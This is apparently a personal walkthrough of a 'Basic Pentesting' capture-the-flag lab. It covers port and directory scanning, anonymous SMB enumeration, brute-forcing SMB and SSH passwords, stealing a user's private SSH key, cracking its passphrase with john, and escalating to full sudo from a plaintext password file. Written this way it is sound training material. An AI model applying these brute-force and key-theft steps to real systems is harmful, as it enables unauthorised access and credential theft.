BASIC PENTESTING.




SCANNING: SERVICES.
Nmap service scan:
nmap -p- -T4 -sV -sS 10.10.67.208
OUTPUT:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 09:54 CEST
Nmap scan report for 10.10.67.208
Host is up (0.053s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




SCANNING: DIRECTORIES.
Knowing httpd is hosted on 80, we run gobuster:
gobuster dir -u 10.10.67.208:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
OUTPUT:
/development




SCANNING: SMB USERS.
Using enum4linux:
enum4linux -U 10.10.67.208
OUTPUT:
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 13 10:05:28 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.67.208
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.67.208 )============================


[+] Got domain/workgroup name: WORKGROUP


 ===================================( Session Check on 10.10.67.208 )===================================


[+] Server 10.10.67.208 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.67.208 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 =======================================( Users on 10.10.67.208 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
enum4linux complete on Sun Jul 13 10:05:31 2025



Note:
Now we can try to use the NULL smb credentials.
SMB1 doesn't work.
SMB2/SMB3 connection:
smbclient -L //10.10.67.208/ -N --option='client min protocol=SMB2' --option='client max protocol=SMB3'
OUTPUT:
Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
SMB1 disabled -- no workgroup available



Anonymous disk share interaction:
smbclient //10.10.67.208/Anonymous -N --option='client min protocol=SMB2' --option='client max protocol=SMB3'

List files:
ls
OUTPUT:
ls
  .                                   D        0  Thu Apr 19 19:31:20 2018
  ..                                  D        0  Thu Apr 19 19:13:06 2018
  staff.txt                           N      173  Thu Apr 19 19:29:55 2018

		14282840 blocks of size 1024. 6253896 blocks available



Download staff:
get staff.txt

Cat the file. OUTPUT:
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay




BRUTEFORCING: SMB.
To ensure we create a proper user list, we use both uppercase and lowercase Jan and Jay.

(FAILED) Hydra bruteforcing:
hydra -L users.txt -P ~/thm/rockyou.txt smb://10.10.67.208
Note:
We forgot smb1 isnt supported. Command OUTPUT:
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-13 10:17:12
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 57377592 login tries (l:4/p:14344398), ~57377592 tries per task
[DATA] attacking smb://10.10.67.208:445/
[ERROR] target smb://10.10.67.208:445/ does not support SMBv1



Crackmapexec bruteforcing:
crackmapexec smb 10.10.67.208 -u users.txt -p ~/thm/rockyou.txt
OUTPUT:
SMB         10.10.67.208    445    BASIC2           [*] Windows 6.1 Build 0 (name:BASIC2) (domain:eu-west-1.compute.internal) (signing:False) (SMBv1:False)
SMB         10.10.67.208    445    BASIC2           [+] eu-west-1.compute.internal\Jan:123456 
Note:
We got a valid pair: user: Jan, password: 123456
ERROR: thm shows said password is a false positive, however, user is valid. 
Thus, we will enumerate passwords with other tool, since hydra is limited to smb1.



Metasploit bruteforcing Jan's SMB password:
Choosing module:
use auxiliary/scanner/smb/smb_login
Setting parameters:
set RHOSTS 10.10.67.208
set USER_FILE users.txt
set set PASS_FILE ~/thm/rockyou.txt
OUTPUT:
[*] 10.10.67.208:445      - 10.10.67.208:445 - Starting SMB login bruteforce
[+] 10.10.67.208:445      - 10.10.67.208:445 - Success: '.\Jan:123456'
[!] 10.10.67.208:445      - No active DB -- Credential data will not be saved!


Connecting to IPC$ share:
smbclient //10.10.67.208/IPC$ -U Jan%123456

Checking files:
ls
OUTPUT:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
Note:
IPC$ contains hidden files and directories that won't be listed.
Also, thm expected the user to bruteforce ssh, not smb.




Hydra bruteforcing Jan's SSH password:
hydra -l jan -P ~/thm/rockyou.txt 10.10.67.208 ssh
OUTPUT:
[22][ssh] host: 10.10.67.208   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found

ssh into jan:
ssh jan@10.10.67.208



Note:
Thm insinuates we need to get kay's password.

Check if jan is sudo:
sudo -l 
OUTPUT:
Sorry, user jan may not run sudo on ip-10-10-67-208.

Check files:
ls -la
OUPUT:
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Jul 13 03:49 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst



As we dont see any easy and clear privesc route, we will run linpeas.
(FAILED) Download in machine:
curl -O https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

Note: 
Since jans home directory is owned by root and not writable by jan, we will proceed in tmp.
Also, curl from tmp still hangs at 0.
Copy to machine (run in attacking machine):
scp ~/thm/linpeas.sh jan@10.10.67.208:/tmp/

Prepare and run linpeas:
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

Based on output:
cat /home/kay/.ssh/id_rsa
Note:
It works.




BRUTEFORCE: SSH KEY.
Copy kays key over to attacking machine:
scp jan@10.10.67.208:/home/kay/.ssh/id_rsa kay_id_rsa

Convert for john:
ssh2john kay_id_rsa > kay_hash.txt

Crack with john:
john kay_hash.txt --wordlist=~/thm/rockyou.txt

Check output:
john --show kay_hash.txt
OUTPUT:
kay_id_rsa:beeswax

Ssh over to kay (using the ssh passphrase, NOT ssh password):
ssh -i kay_id_rsa kay@10.10.67.208
ERROR: permissions are too open. We restrict them and retry ssh:
chmod 600 kay_id_rsa



Knowing pass.bak was stored in kay's home folder, we just check it out:
ls -l
OUTPUT:
total 4
-rw------- 1 kay kay 57 Apr 23  2018 pass.bak

Cat it out:
cat pass.bak
OUTPUT:
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

We test if we found the sudo password (kays password):
sudo -l
OUTPUT:
Matching Defaults entries for kay on ip-10-10-67-208:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on ip-10-10-67-208:
    (ALL : ALL) ALL

